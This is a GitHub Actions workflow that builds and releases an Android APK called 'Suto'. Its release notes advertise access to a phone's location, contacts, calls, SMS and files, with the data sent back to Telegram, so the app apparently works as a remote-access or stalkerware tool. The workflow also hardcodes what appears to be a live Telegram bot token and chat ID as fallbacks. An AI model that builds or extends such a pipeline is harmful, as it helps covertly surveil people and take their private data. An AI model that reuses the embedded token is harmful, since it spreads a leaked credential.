name: Build APK - Suto FINAL Production Simple

on:
  workflow_dispatch:
    inputs:
      build_type:
        description: 'Build Type'
        required: true
        default: 'debug'
        type: choice
        options:
          - debug
          - release
  push:
    branches: [ main ]
    paths:
      - 'app/**'
      - 'gradle.properties'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Cache Gradle
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: gradle-8.6-${{ hashFiles('**/*.gradle*') }}
          restore-keys: gradle-8.6-

      - name: Create local.properties with Secrets (Real Tokens for Final APK)
        env:
          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
          GH_PAT: ${{ secrets.GH_PAT }}
          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
          # Use secrets, fallback to test token if secret not set (for local builds)
          echo "telegram.bot.token=${BOT_TOKEN:-8670943963:AAFz--BuWd6bvldpUPJ34bf-YCCrytX1fuo}" >> local.properties
          echo "telegram.chat.id=${CHAT_ID:-289240360}" >> local.properties
          echo "github.pat=${GH_PAT:-dummy}" >> local.properties
          echo "firebase.url=https://sutoapp-e155c-default-rtdb.firebaseio.com/app_features.json" >> local.properties
          echo "github.user=dthakur-dt" >> local.properties
          echo "github.repo=Suto" >> local.properties
          echo "✅ local.properties created with real tokens from secrets - App will connect to Telegram + GitHub"
          cat local.properties | sed 's/\(bot.token\|pat\).*/\1=***HIDDEN***/'

      - name: Download Wrapper Jar
        run: |
          mkdir -p gradle/wrapper
          if [ ! -f "gradle/wrapper/gradle-wrapper.jar" ]; then
            curl -L -o gradle/wrapper/gradle-wrapper.jar https://github.com/gradle/gradle/raw/v8.6.0/gradle/wrapper/gradle-wrapper.jar || echo "Download failed"
          fi
          chmod +x ./gradlew
          ls -lh gradle/wrapper/

      - name: Build Debug APK - Final Production
        run: |
          ./gradlew assembleDebug --no-daemon --stacktrace -Dorg.gradle.parallel=false || \
          ./gradlew app:assembleDebug --no-daemon --stacktrace

      - name: List APK
        if: always()
        run: find app/build -name "*.apk" -type f -exec ls -lh {} \;

      - name: Upload Artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: Suto-FINAL-Simple-APK-${{ github.run_number }}
          path: app/build/outputs/apk/debug/*.apk
          if-no-files-found: warn

      - name: Release APK
        if: success()
        uses: softprops/action-gh-release@v1
        with:
          tag_name: final-simple-${{ github.run_number }}
          name: "Suto FINAL Simple v6.1 - Telegram Access Control"
          body: |
            FINAL APK - Simple Console + Telegram Access Control + App Connect Fix

            Fixes:
            1. Telegram access control - Simple commands
            2. Console confusing -> Simplified clean UI
            3. App connect fix - Real tokens from secrets, not dummy

            Features: All Read/Write Permissions, Location+Battery+Mobile+Contacts+Calls+SMS+Files, Client Access Proper Format, APK Returns Data to Telegram
          files: app/build/outputs/apk/debug/app-debug.apk
          token: ${{ secrets.GITHUB_TOKEN }}
